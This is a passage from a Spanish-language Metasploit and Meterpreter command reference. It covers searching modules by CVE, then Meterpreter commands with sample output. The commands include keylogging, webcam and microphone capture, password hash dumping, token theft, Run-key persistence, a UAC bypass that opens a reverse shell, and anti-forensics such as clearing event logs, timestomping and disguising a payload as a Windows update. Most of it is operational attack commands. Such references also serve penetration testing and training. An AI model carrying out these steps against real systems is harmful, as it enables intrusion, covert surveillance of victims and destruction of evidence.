│   ├── example/
│   ├── fuzzers/
│   ├── gather/
│   ├── parser/
│   ├── pdf/
│   ├── scanner/
│   ├── server/
│   ├── sniffer/
│   ├── spoof/
│   ├── sqli/
│   ├── voip/
│   └── vsploit/
├── post/
│   ├── aix/
│   ├── apple_ios/
│   ├── bsd/
│   ├── firefox/
│   ├── hardware/
│   ├── linux/
│   ├── multi/
│   ├── networking/
│   ├── osx/
│   ├── solaris/
│   └── windows/
├── encoders/
│   ├── cmd/
│   ├── generic/
│   ├── mipsbe/
│   ├── mipsle/
│   ├── ppc/
│   ├── sparc/
│   ├── x64/
│   └── x86/
├── evasion/
│   └── windows/
└── nops/
    ├── aarch64/
    ├── armbe/
    ├── mipsbe/
    ├── ppc/
    ├── sparc/
    ├── tty/
    ├── x64/
    └── x86/
```

### Búsqueda por [cve](../raw/s3c-f0nd4m3nt0s.md#cve) Específico

```
msf6 > search cve:2017:0143
# MS17-010 EternalBlue
msf6 > search cve:2019:0708
# BlueKeep RDP
msf6 > search cve:2020:1472
# Zerologon
msf6 > search cve:2021:1675
# PrintNightmare
msf6 > search cve:2021:44228
# Log4Shell
msf6 > search cve:2022:22963
# Spring4Shell
msf6 > search cve:2023:23397
# Outlook Elevation of Privilege
msf6 > search cve:2023:34362
# MOVEit Transfer
msf6 > search cve:2024:1708
# ScreenConnect RCE
msf6 > search cve:2024:38077
# Windows Remote Desktop Licensing RCE
```

### Búsqueda por Rank

```
# Excellent (casi nunca falla, produce shell 100% confiable)
msf6 > search rank:excellent

# Great (muy confiable, probado en múltiples entornos)
msf6 > search rank:great

# Good (confiable en condiciones normales)
msf6 > search rank:good

# Normal (funciona generalmente)
msf6 > search rank:normal

# Average (no siempre funciona, depende de condiciones)
msf6 > search rank:average

# Low (poco confiable, condiciones muy específicas)
msf6 > search rank:low

# Manual (requiere intervención manual)
msf6 > search rank:manual
```

### Búsqueda por Autor

```
msf6 > search author:hdm
# HD Moore - creador original de Metasploit
msf6 > search author:jvazquez-r7
# Juan Vazquez (contribuidor famoso)
msf6 > search author:todb
# Tod Beardsley - director de seguridad de Rapid7
msf6 > search author:juan vazquez
# Búsqueda por nombre completo
msf6 > search author:sinn3r
msf6 > search author:jduck
msf6 > search author:egyp7
```

### Búsqueda por Fecha de Divulgación

```
msf6 > search disclosure_date:2024
# Todos los módulos divulgados en 2024
msf6 > search disclosure_date:>2023-01-01
# Divulgados DESPUÉS del 1 de enero de 2023
msf6 > search disclosure_date:<2020-01-01
# Divulgados ANTES de 2020
msf6 > search disclosure_date:2023-01 disclosure_date:2023-06
# Entre enero y junio de 2023
```

### Búsqueda por Múltiples Campos

```
# Combina todo
msf6 > search type:exploit platform:windows rank:excellent cve:2023
msf6 > search type:auxiliary platform:linux app:server
msf6 > search type:post platform:windows rank:good author:jvazquez
msf6 > search name:exchange type:exploit rank:good disclosure_date:>2021
msf6 > search platform:linux sname:apache type:auxiliary scanner
msf6 > search name:tomcat type:exploit platform:java
msf6 > search name:wordpress type:exploit rank:excellent
msf6 > search name:java type:payload platform:java
```

### Module Metadata

Cada módulo tiene metadata rastreable. Podés verla con `info`:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info

# Metadata completo:
# - Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
# - Module: exploit/windows/smb/ms17_010_eternalblue (full path)
# - Platform: Windows
# - Arch: x64
# - Privileged: Yes (necesita privilegios de admin para explotar bien)
# - License: MSF_LICENSE
# - Rank: Excellent
# - Disclosed: 2017-03-14
# - References: CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0147, CVE-2017-0148
# - URL: https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
# - Also known as: ETERNALBLUE
# - Targets: Windows 7, Windows Server 2008, Windows 8.1, Windows Server 2012
# - Payload space: 870 bytes
# - Avoid characters: \x00\x0a\x0d\x5c\x5f\x2f\x2e\xff
# - Check: Supported (puede verificar vulnerabilidad sin explotar)
```

### Creación de Repositorios Locales de Módulos

Podés crear tu propio repositorio de módulos personalizados:

```
# Crear estructura de directorios
$ mkdir -p ~/.msf4/modules/exploits/custom
$ mkdir -p ~/.msf4/modules/auxiliary/custom
$ mkdir -p ~/.msf4/modules/post/custom
$ mkdir -p ~/.msf4/modules/payloads/custom
$ mkdir -p ~/.msf4/modules/encoders/custom
$ mkdir -p ~/.msf4/modules/evasion/custom
$ mkdir -p ~/.msf4/modules/nops/custom

# Copiar módulos custom
$ cp mi_exploit.rb ~/.msf4/modules/exploits/custom/
$ cp mi_scanner.rb ~/.msf4/modules/auxiliary/custom/

# Recargar en msfconsole
msf6 > reload_all

# Usar
msf6 > use exploit/custom/mi_exploit
msf6 > use auxiliary/custom/mi_scanner
```

También podés cargar directorios temporales con `loadpath`:

```
msf6 > loadpath /tmp/mis_modulos/
[*] Loaded 3 modules:
    - exploit/custom/prueba_exploit
    - auxiliary/custom/prueba_scanner
    - post/custom/prueba_post
```

O configurar rutas adicionales en el archivo de configuración:

```
# ~/.msf4/config
ModulePaths: /home/user/modulos_empresa,/home/user/modulos_pentest
```

---

## 3. [meterpreter](../raw/m3t4spl01t.md#meterpreter) Avanzado - Todos los Comandos (400+ líneas)

### Core (Comandos Básicos del Nucleo)

#### background
Manda la sesión actual a background y volvés a [msfconsole](../raw/m3t4spl01t.md#msfconsole).

```
meterpreter > background
[*] Backgrounding session 1...
msf6 >
```

```
meterpreter > bg
# Abreviación de background
msf6 >
```

#### bgkill
Mata un script corriendo en background de meterpreter.

```
meterpreter > bgkill 0
[*] Killing background script 0...
```

#### bglist
Lista los scripts corriendo en background.

```
meterpreter > bglist
[*] Background scripts:
    0: /usr/share/metasploit-framework/modules/post/windows/capture/keylog_recorder.rb
    1: custom_script.rb
```

#### bgrun
Ejecuta un script en background (no bloquea la sesión).

```
meterpreter > bgrun post/windows/capture/keylog_recorder
[*] Running keylog_recorder in background...
meterpreter > # Podés seguir usando meterpreter mientras corre
```

```
meterpreter > bgrun post/multi/gather/grep SESSION=1 PATTERN=password PATH=C:\\
[*] Running grep in background...
```

#### channel
Maneja los canales de comunicación activos (cada shell abierta, cada conexión).

```
meterpreter > channel -l
Active Channels
===============
  Id  Type
  --  ----
  0   stdapi_process (shell)
  1   stdapi_fs_file (C:\Users\Public\note.txt)
```

```
meterpreter > channel -i 0
Interacting with channel 0...
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.
C:\Users\Admin>
```

```
meterpreter > channel -r 0
# Remueve (cierra) el canal 0
```

#### close
Cierra un canal específico.

```
meterpreter > close 1
[*] Closed channel 1.
```

#### exit
Sale de la sesión de meterpreter completamente.

```
meterpreter > exit
[*] Shutting down Meterpreter...
[*] 192.168.1.100 - Meterpreter session 1 closed.
```

#### help
Muestra ayuda de los comandos de meterpreter.

```
meterpreter > help
# Lista completa de comandos ordenados por categoría
```

```
meterpreter > help kiwi
# Ayuda específica de la extensión kiwi
```

#### interrupt
Interrumpe la ejecución actual (equivalente a Ctrl+C).

```
meterpreter > interrupt
[*] Interrupting current execution...
```

#### irb
Abre consola Ruby interactiva dentro de meterpreter.

```
meterpreter > irb
[*] Starting IRB shell...
>> client.sys.process.getpid
=> 4520
>> client.sys.config.getuid
=> "NT AUTHORITY\SYSTEM"
```

```
meterpreter > irb
>> client.fs.dir.entries("C:\\Users")
=> ["Administrator", "Default", "Public", "Desktop.ini"]
```

#### load
Carga una extensión en meterpreter (ver sección de extensiones completa).

```
meterpreter > load kiwi
meterpreter > load python
meterpreter > load extapi
meterpreter > load powershell
meterpreter > load incognito
meterpreter > load priv
meterpreter > load railgun
```

#### machine_id
Muestra el ID único de la máquina.

```
meterpreter > machine_id
[*] Machine ID: 4a3b2c1d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
```

#### migrate
Migra el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de meterpreter a otro [proceso](../raw/0s-f0nd4m3nt0s.md#procesos). Esencial para estabilidad y evasión.

```
meterpreter > migrate 4520
[*] Migrating from 1234 to 4520...
[*] Migration completed successfully.
```

```
meterpreter > migrate -N explorer.exe
[*] Searching for explorer.exe...
[*] Migrating to 4520...
[*] Migration completed successfully.
```

```
meterpreter > migrate -N svchost.exe -t 5000
# -t: timeout en milisegundos
```

```
meterpreter > migrate -n lsass.exe
# Migrar a lsass.exe (da acceso a credenciales, pero es riesgoso)
```

#### pivot
Agrega una nueva ruta de [red](../raw/r3d3s-f0nd4m3nt0s.md) a través de la sesión actual.

```
meterpreter > pivot -a 10.10.10.0 -n 255.255.255.0
[*] Adding route to 10.10.10.0/255.255.255.0 through session 1...
```

```
meterpreter > pivot -l
# Lista los pivots activos
```

#### pry
Abre una consola Pry (alternativa a IRB, más moderna).

```
meterpreter > pry
[1] pry(#<Msf::Sessions::Meterpreter_x64_Win>)>
```

#### quit
Sale de meterpreter (igual que exit).

```
meterpreter > quit
[*] Shutting Down Meterpreter...
```

#### read
Lee datos de un canal.

```
meterpreter > read 0
[*] Reading from channel 0...
Microsoft Windows [Version 10.0.19045.3803]
```

#### resource
Ejecuta un resource script dentro de meterpreter.

```
meterpreter > resource /tmp/auto_enum.rc
[*] Running resource script...
```

```
# En un resource script de meterpreter:
cat > meterpreter_auto.rc << 'EOF'
sysinfo
getuid
getpid
ps
ipconfig
route
arp
netstat
EOF

meterpreter > resource meterpreter_auto.rc
```

#### run
Ejecuta un módulo de post-explotación dentro de la sesión.

```
meterpreter > run post/windows/gather/hashdump
```

```
meterpreter > run post/multi/recon/local_exploit_suggester
```

```
meterpreter > run post/windows/gather/enum_applications
```

#### sessions
Maneja sesiones dentro de meterpreter (para sesiones hijas).

```
meterpreter > sessions -l
Active sessions
===============
  Id  Name  Type                     Information           Connection
  --  ----  ----                     -----------           ----------
  1         meterpreter x64/win64    Admin @ DESKTOP-ABC   10.0.0.5:4444 -> 192.168.1.100:49152
```

#### sleep
Pone a dormir la sesión de meterpreter por N segundos.

```
meterpreter > sleep 10
[*] Sleeping for 10 seconds...
```

```
meterpreter > sleep 3600
# Duerme por 1 hora (útil para evitar detección)
```

#### suspend
Suspende el proceso actual de meterpreter.

```
meterpreter > suspend
[*] Suspending meterpreter process...
```

#### transport
Maneja los transportes de comunicación (útil para cambiar de [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) en caliente).

```
meterpreter > transport list
Session Transport List
======================
  Id  URL                                Comms  Retries  Retry Wait
  --  ---                                -----  -------  ----------
  0   tcp://192.168.1.50:4444            comms  10       5
  1   http://192.168.1.50:8080/CkVVa     comms  10       5
  2   https://192.168.1.50:443/CkVVa     comms  10       5
```

```
meterpreter > transport add -t http://10.0.0.5:8080/abc123 -i 10 -r 5
[*] Adding transport...
```

```
meterpreter > transport change -r 1
[*] Changing to transport 1 (http://192.168.1.50:8080/CkVVa)...
# Cambia de reverse_tcp a reverse_http EN VIVO, sin perder la sesión
```

```
meterpreter > transport next
# Cambia al siguiente transporte de la lista
```

#### use
Alias para cargar extensiones (igual que load).

```
meterpreter > use kiwi
[!] Loaded kiwi extension
```

### File System ([sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos))

#### cat
Muestra el contenido de un archivo en la terminal.

```
meterpreter > cat C:\Users\Admin\Desktop\note.txt
Contenido del archivo de texto...
```

```
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

#### cd
Cambia de directorio en la máquina víctima.

```
meterpreter > cd C:\Users\Admin\Desktop
meterpreter > cd C:\Windows\System32
meterpreter > cd ..
```

#### checksum
Calcula checksums MD5, SHA1, SHA256 de archivos.

```
meterpreter > checksum md5 C:\Users\Public\payload.exe
[*] MD5 (C:\Users\Public\payload.exe) = d41d8cd98f00b204e9800998ecf8427e
```

```
meterpreter > checksum sha256 C:\Windows\System32\notepad.exe
[*] SHA256 (C:\Windows\System32\notepad.exe) = ...
```

#### [chmod](../raw/0s-f0nd4m3nt0s.md#permisos)
Cambia [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de archivos (solo en Linux).

```
meterpreter > chmod 0755 /tmp/payload.elf
```

```
meterpreter > chmod +x /tmp/script.sh
```

#### cp
Copia archivos en la máquina víctima.

```
meterpreter > cp C:\Users\Admin\Desktop\secret.txt C:\Users\Public\secret_copy.txt
```

```
meterpreter > cp /etc/passwd /tmp/passwd_copy
```

#### del
Borra archivos en la máquina víctima.

```
meterpreter > del C:\Users\Admin\Desktop\evidencia.txt
[*] Deleted C:\Users\Admin\Desktop\evidencia.txt
```

```
meterpreter > del /tmp/malicious.sh
```

#### dir
Lista directorios (igual que ls pero en formato DOS).

```
meterpreter > dir C:\Users\Admin\Desktop
Directory: C:\Users\Admin\Desktop
=================================
Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  282     fil   2024-01-15 10:30:00 -0300  note.txt
100777/rwxrwxrwx  73802   fil   2024-01-15 11:00:00 -0300  payload.exe
040777/rwxrwxrwx  0       dir   2024-01-14 09:00:00 -0300  Documents
```

#### download
Descarga archivos de la víctima al atacante.

```
meterpreter > download C:\Users\Admin\Desktop\secret.txt /tmp/secret.txt
[*] Downloading: C:\Users\Admin\Desktop\secret.txt -> /tmp/secret.txt
[*] Downloaded 282 bytes.
```

```
meterpreter > download -r C:\Users\Admin\Desktop /root/pentest_data/
# Descarga recursiva de todo el directorio
```

```
meterpreter > download C:\Windows\NTDS\ntds.dit /tmp/ntds.dit
# Descargar base de datos de Active Directory
```

#### edit
Edita un archivo remoto (abre editor local).

```
meterpreter > edit C:\Users\Public\note.txt
# Abre el archivo en el editor configurado
```

```
meterpreter > edit /etc/hosts
```

#### getlwd
Muestra el directorio de trabajo local (atacante).

```
meterpreter > getlwd
Local: /root/pentest/data
```

#### getwd
Muestra el directorio de trabajo remoto (víctima) — igual que pwd.

```
meterpreter > getwd
C:\Users\Admin\Desktop
```

#### lcd
Cambia el directorio local (atacante).

```
meterpreter > lcd /tmp/pentest
```

```
meterpreter > lcd C:\Users\Public
```

#### lls
Lista archivos del directorio local (atacante).

```
meterpreter > lls
[*] Local listing:
drwxr-xr-x  2 root root  4096 Jan 15 10:00 .
drwxr-xr-x  4 root root  4096 Jan 15 09:00 ..
-rw-r--r--  1 root root   282 Jan 15 10:30 data.txt
```

#### lpwd
Muestra el directorio local (atacante).

```
meterpreter > lpwd
Local: /root/pentest
```

#### ls
Lista archivos en la máquina víctima.

```
meterpreter > ls
Listing: C:\Users\Admin\Desktop
================================
Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2024-01-14 09:00:00 -0300  Documents
100666/rw-rw-rw-  282     fil   2024-01-15 10:30:00 -0300  note.txt
100777/rwxrwxrwx  73802   fil   2024-01-15 11:00:00 -0300  payload.exe
```

```
meterpreter > ls -la /etc
```

```
meterpreter > ls -R C:\Users\Admin\Desktop
# Listado recursivo
```

#### mkdir
Crea un directorio en la víctima.

```
meterpreter > mkdir C:\Users\Public\Temp\pentest
```

```
meterpreter > mkdir /tmp/backdoor
```

#### mv
Mueve o renombra archivos en la víctima.

```
meterpreter > mv C:\Users\Public\payload.exe C:\Users\Public\windows_update.exe
```

```
meterpreter > mv C:\Users\Admin\Desktop\secret.txt C:\Users\Public\readme.txt
```

#### pwd
Muestra el directorio actual en la víctima.

```
meterpreter > pwd
C:\Users\Admin\Desktop
```

#### rm
Borra archivos (alias de del).

```
meterpreter > rm C:\Users\Admin\Desktop\file.txt
```

```
meterpreter > rm -r C:\Users\Admin\Desktop\logs
# Borra recursivamente
```

#### rmdir
Borra directorios.

```
meterpreter > rmdir C:\Users\Public\Temp
```

#### search
Busca archivos en la máquina víctima.

```
meterpreter > search -f *.docx -r C:\Users\
[*] Searching for *.docx in C:\Users\...
[*] Found 12 files...
```

```
meterpreter > search -f *.kdbx -r C:\
# Buscar bases de KeePass
meterpreter > search -f *.rdp -r C:\Users\
# Archivos de conexión RDP
meterpreter > search -f *.vnc -r C:\Users\
# Configuración VNC
meterpreter > search -f pass*.txt -r C:\
# Archivos que empiecen con "pass"
meterpreter > search -f id_rsa* -r C:\Users\
# SSH keys
meterpreter > search -f *.config -r C:\
# Archivos de configuración
meterpreter > search -f web.config -r C:\inetpub
# Config de IIS
```

#### show_mount
Muestra los puntos de montaje/unidades disponibles.

```
meterpreter > show_mount
[*] Mount points / Drives:
    Name    Type               Size (Total/Free)
    ----    ----               ----------------
    C:\     NTFS               238GB / 150GB
    D:\     NTFS               500GB / 300GB
```

### Networking (Red)

#### [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp)
Muestra la tabla ARP de la víctima.

```
meterpreter > arp
ARP Table
=========
  IP              MAC                 Interface
  ----            ---                 ---------
  192.168.1.1     aa:bb:cc:dd:ee:ff  192.168.1.100
  192.168.1.50    11:22:33:44:55:66  192.168.1.100
```

#### getproxy
Muestra la configuración de [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) de la víctima.

```
meterpreter > getproxy
[*] Proxy Configuration:
    Auto Detection: Enabled
    Auto Config URL: http://proxy.company.com/wpad.dat
    Proxy Server: http://proxy.company.com:8080
    Bypass List: *.local;10.*;192.168.*
```

#### ifconfig
Muestra interfaces de red.

```
meterpreter > ifconfig

Interface 1: Intel(R) Ethernet Connection
==========================================
  Name         : eth0
  Hardware MAC : aa:bb:cc:dd:ee:ff
  MTU          : 1500
  IPv4 Address : 192.168.1.100
  IPv4 Netmask : 255.255.255.0
  IPv6 Address : fe80::aabb:ccdd:eeff
```

```
meterpreter > ifconfig eth0
# Muestra solo la interfaz eth0
```

#### ipconfig
Alias de ifconfig.

```
meterpreter > ipconfig
# Misma salida que ifconfig
```

#### netstat
Muestra conexiones de red activas y puertos en escucha.

```
meterpreter > netstat

Connection list
===============
  Proto  Local address        Remote address        State        PID
  -----  -------------        --------------        -----        ---
  TCP    0.0.0.0:135          0.0.0.0:*             LISTEN       1052
  TCP    0.0.0.0:445          0.0.0.0:*             LISTEN       4
  TCP    192.168.1.100:49152  10.0.0.5:4444         ESTABLISHED  4520
```

```
meterpreter > netstat -a
# Muestra todas las conexiones (listening + established)
```

#### portfwd
Maneja port forwarding a través de la sesión.

```
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.50
[*] Local TCP relay created: 0.0.0.0:3389 <-> 10.10.10.50:3389
```

```
meterpreter > portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 10.10.10.100
```

```
meterpreter > portfwd list
Active Port Forwards
====================
  0  tcp  0.0.0.0:3389       ->  10.10.10.50:3389
  1  tcp  0.0.0.0:8080       ->  10.10.10.100:80
```

```
meterpreter > portfwd delete -l 3389
[*] Successfully stopped TCP relay on 0.0.0.0:3389
```

```
meterpreter > portfwd flush
[*] All TCP relays stopped
```

#### resolve
Resuelve nombres de host a [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips).

```
meterpreter > resolve google.com
[*] google.com resolves to: 142.250.80.14
```

```
meterpreter > resolve dc01.empresa.local mail.empresa.local
[*] dc01.empresa.local resolves to: 10.10.10.1
[*] mail.empresa.local resolves to: 10.10.10.50
```

#### route
Muestra la tabla de rutas de la víctima.

```
meterpreter > route
IPv4 Route Table
================
  Network          Netmask          Gateway         Interface
  -------          -------          -------         ---------
  0.0.0.0          0.0.0.0          192.168.1.1     192.168.1.100
  10.10.10.0       255.255.255.0    10.10.10.1      10.10.10.100
  127.0.0.0        255.0.0.0        127.0.0.1       127.0.0.1
```

### System (Sistema)

#### clearev
Limpia los logs de eventos de Windows.

```
meterpreter > clearev
[*] Wiping Security logs...
[*] Wiping System logs...
[*] Wiping Application logs...
[*] Total log files cleaned: 3
```

```
meterpreter > clearev -l Security
[*] Wiping Security logs...
```

#### drop_token
Descarta el token de impersonación actual.

```
meterpreter > drop_token
[*] Dropped token...
```

#### execute
Ejecuta un comando o programa en la víctima.

```
meterpreter > execute -f cmd.exe -c -i
# -c: canalizar salida, -i: interactivo
```

```
meterpreter > execute -f powershell.exe -a "-enc BASE64ENCODED" -H
# -H: oculto (no muestra ventana)
```

```
meterpreter > execute -f C:\Users\Public\payload.exe -H
# Ejecuta payload oculto
```

```
meterpreter > execute -f cmd.exe -a "/c whoami" -c
[*] Output:
desktop-abc\admin
```

```
meterpreter > execute -f /bin/bash -c -i -t
# -t: pseudo-tty (Linux)
```

#### getenv
Obtiene variables de entorno.

```
meterpreter > getenv
PATH=C:\Windows\system32;C:\Windows;...
USERNAME=Admin
COMPUTERNAME=DESKTOP-ABC
```

#### getpid
Muestra el PID del proceso de meterpreter.

```
meterpreter > getpid
Current PID: 4520
```

#### getprivs
Muestra los privilegios del proceso actual.

```
meterpreter > getprivs
Enabled Process Privileges
==========================
  SeBackupPrivilege
  SeChangeNotifyPrivilege
  SeDebugPrivilege
  SeImpersonatePrivilege
  SeIncreaseQuotaPrivilege
  SeLoadDriverPrivilege
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
```

#### getsid
Muestra el SID del usuario actual.

```
meterpreter > getsid
Server SID: S-1-5-21-123456789-987654321-123456789-500
```

#### getuid
Muestra el usuario actual.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### kill
Mata un proceso por PID.

```
meterpreter > kill 1234
[*] Killing PID 1234...
[*] Process killed.
```

#### localtime
Muestra la hora local de la víctima.

```
meterpreter > localtime
[*] Local time: 2024-01-15 14:30:22 (UTC -0300)
```

#### pgrep
Busca procesos por nombre y muestra sus PIDs.

```
meterpreter > pgrep explorer.exe
4520
6472
```

#### pkill
Mata procesos por nombre.

```
meterpreter > pkill notepad.exe
[*] Killing notepad.exe...
[*] Process(es) killed.
```

#### ps
Lista procesos de la máquina víctima.

```
meterpreter > ps

Process List
============
 PID   PPID  Name           Arch  Session  User                          Path
 ---   ----  ----           ----  -------  ----                          ----
 4     0     System         x64   0        NT AUTHORITY\SYSTEM
 4520  6472  explorer.exe   x64   1        DESKTOP-ABC\Admin             C:\Windows\explorer.exe
 1052  500   svchost.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
```

```
meterpreter > ps -U root
# Filtra procesos de root en Linux
```

```
meterpreter > ps -S lsass
# Filtra procesos con nombre que contenga "lsass"
```

#### reboot
Reinicia la máquina víctima.

```
meterpreter > reboot
[*] Rebooting...
```

#### reg
Interactúa con el registro de Windows.

```
meterpreter > reg query -k HKLM\Software\Microsoft\Windows\CurrentVersion\Run
[*] Listing keys...
    WindowsDefender
    SecurityHealth
```

```
meterpreter > reg setval -k HKLM\Software\Microsoft\Windows\CurrentVersion\Run -d "C:\Users\Public\payload.exe" -v "WindowsUpdate"
# Agrega persistencia en Run
```

```
meterpreter > reg enumkey -k HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
```

#### rev2self
Vuelve al token original después de impersonar.

```
meterpreter > rev2self
[*] Reverted to original token.
```

#### shell
Abre una shell del [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) víctima.

```
meterpreter > shell
Process 6532 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.
C:\Users\Admin>whoami
desktop-abc\admin
```

#### shutdown
Apaga la máquina víctima.

```
meterpreter > shutdown
[*] Shutting down...
```

#### steal_token
Roba el token de seguridad de otro proceso.

```
meterpreter > steal_token 4520
[*] Stolen token from PID 4520 (explorer.exe)
[*] Token stolen successfully. Now running as: DESKTOP-ABC\Admin
```

```
meterpreter > steal_token 1052
[*] Stolen token from PID 1052 (svchost.exe)
[*] Token stolen successfully. Now running as: NT AUTHORITY\SYSTEM
```

#### sysinfo
Muestra información completa del sistema.

```
meterpreter > sysinfo
Computer    : DESKTOP-ABC
OS          : Windows 10 Pro (10.0.19045).
Arch        : x64
Domain      : EMPRESA.LOCAL
Logged On Users : 2
Meterpreter : x64/windows
System uptime: 15 days, 12:34:56
```

#### timestomp
Modifica timestamps de archivos.

```
meterpreter > timestomp C:\Users\Public\evil.exe -v
[*] Showing MACE timestamps for C:\Users\Public\evil.exe:
    Modified      : 2024-01-15 14:30:00
    Accessed      : 2024-01-15 14:30:00
    Created       : 2024-01-15 14:30:00
    Entry Modified: 2024-01-15 14:30:00
```

```
meterpreter > timestomp C:\Users\Public\evil.exe -c "01/01/2020 00:00:00"
```

### User Interface (Interfaz de Usuario)

#### desktop
Mueve el escritorio (cambia de estación de escritorio).

```
meterpreter > desktop
[*] Switching to desktop...
```

#### enumdesktops
Enumera los escritorios disponibles.

```
meterpreter > enumdesktops
[*] Enumerating all desktops...
    Session 1
      ├── WinLogon
      ├── Default
      └── Screen-saver
```

#### getdesktop
Muestra el escritorio actual.

```
meterpreter > getdesktop
[*] Session 1\Default
```

#### idletime
Muestra el tiempo de inactividad del usuario.

```
meterpreter > idletime
[*] User idle time: 5 minutes 23 seconds
```

#### screenshare
Comparte en tiempo real la pantalla de la víctima en el [navegador](../raw/br0ws3r-3xpl01t4t10n.md) del atacante.

```
meterpreter > screenshare
[*] Started screenshare on http://0.0.0.0:7788...
[*] Use your browser to watch the target's desktop
```

#### screenshot
Captura la pantalla de la víctima.

```
meterpreter > screenshot
[*] Screenshot saved to: /root/screenshots/20240115_143022.jpg
```

```
meterpreter > screenshot -d 1
# Toma screenshot de todos los displays
```

#### setdesktop
Cambia al escritorio especificado.

```
meterpreter > setdesktop "WinLogon"
[*] Switching to desktop: WinLogon
```

#### uictl
Controla la interfaz de usuario (habilita/deshabilita teclado, mouse).

```
meterpreter > uictl disable mouse
[*] Mouse disabled
```

```
meterpreter > uictl disable keyboard
[*] Keyboard disabled
```

### Webcam

#### record_mic
Graba audio del micrófono de la víctima.

```
meterpreter > record_mic -d 10
[*] Recording mic for 10 seconds...
[*] Audio saved to: /root/audio/20240115_143022.wav
```

#### webcam_chat
Inicia un chat de video con la víctima.

```
meterpreter > webcam_chat
[*] Starting webcam chat on http://0.0.0.0:6666...
```

#### webcam_list
Lista las cámaras web disponibles.

```
meterpreter > webcam_list
[*] Webcam List:
    1: Integrated Webcam
    2: USB Camera
```

#### webcam_snap
Toma una foto con la cámara web.

```
meterpreter > webcam_snap
[*] Image saved to: /root/webcams/20240115_143022.jpeg
```

#### webcam_stream
Transmite video en vivo de la cámara web.

```
meterpreter > webcam_stream
[*] Starting webcam stream...
[*] Stream available at http://0.0.0.0:6666/
```

### Audio

#### play
Reproduce un archivo de audio en la víctima.

```
meterpreter > play C:\Windows\Media\tada.wav
```

### GUI

#### keyscan_dump
Muestra las teclas capturadas por el keylogger.

```
meterpreter > keyscan_dump
[*] Dumping captured keystrokes...
<Return> hola<Return> usuario123<Return> Password123!<Return>
```

#### keyscan_start
Inicia el keylogger.

```
meterpreter > keyscan_start
[*] Starting keystroke capture...
```

#### keyscan_stop
Detiene el keylogger.

```
meterpreter > keyscan_stop
[*] Stopping keystroke capture...
```

#### mouse
Controla el mouse de la víctima.

```
meterpreter > mouse move 500 300
# Mueve el mouse a la posición (500, 300)
```

```
meterpreter > mouse click left
# Click izquierdo
meterpreter > mouse click right
# Click derecho
meterpreter > mouse doubleclick
# Doble click
```

### [privilege escalation](../raw/l1n9x-pr1v3sc.md)

#### getsystem
Intenta escalar privilegios a SYSTEM automáticamente.

```
meterpreter > getsystem
[*] Trying technique 1 (Named Pipe Impersonation (In Memory/Admin))...
[*] Technique 1 succeeded.
[+] Got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

```
meterpreter > getsystem -t 0
# Técnica 0: Todas las técnicas disponibles (por defecto)
# Técnica 1: Named Pipe Impersonation (In Memory/Admin)
# Técnica 2: Named Pipe Impersonation (Dropper/Admin)
# Técnica 3: Token Duplication (In Memory/Admin)
# Técnica 4: Named Pipe Impersonation (RPCSS variant)
# Técnica 5: Named Pipe Impersonation (PrintSpooler variant)
```

#### bypassuac
Módulos para saltarse el Control de Cuentas de Usuario.

```
msf6 > use exploit/windows/local/bypassuac_fodhelper
msf6 exploit(windows/local/bypassuac_fodhelper) > set SESSION 1
msf6 exploit(windows/local/bypassuac_fodhelper) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_fodhelper) > set LHOST 10.0.0.5
msf6 exploit(windows/local/bypassuac_fodhelper) > run
```


---
## 4. Extensiones de [meterpreter](../raw/m3t4spl01t.md#meterpreter) - Referencia COMPLETA (300+ líneas)

---
## 5. [exploit](../raw/m3t4spl01t.md#exploits) Development con [metasploit](../raw/m3t4spl01t.md) (300+ líneas)

### Mixin Reference (Mixins Esenciales)

#### Msf::Exploit::Remote::[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)
Para exploits que se conectan por TCP.

```
include Msf::Exploit::Remote::Tcp

# Metodos disponibles:
connect         # Conectar al target
disconnect      # Desconectar
handler         # Manejar conexion del payload
```

#### Msf::Exploit::Remote::HttpClient
Para exploits web.

```
include Msf::Exploit::Remote::HttpClient

res = send_request_cgi({
  'method' => 'GET',
  'uri' => normalize_uri(target_uri.path, 'index.php'),
  'vars_get' => { 'cmd' => 'whoami' },
  'cookie' => 'session=abc123'
})
```

#### Msf::Exploit::Remote::[smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)
Para exploits SMB.

```
include Msf::Exploit::Remote::SMB
# smb_login, smb_create, smb_read, smb_write, smb_close
```

#### Msf::Exploit::Remote::MSSQL
Para ataques a MSSQL.

```
include Msf::Exploit::Remote::MSSQL
# mssql_login, mssql_query, mssql_xpcmdshell, mssql_upload_exec
```

#### Msf::Exploit::Remote::MYSQL
Para ataques a MySQL.

```
include Msf::Exploit::Remote::MYSQL
# mysql_login, mysql_query, mysql_get_hashes
```

#### Msf::Exploit::Remote::Ftp
Para ataques FTP.

```
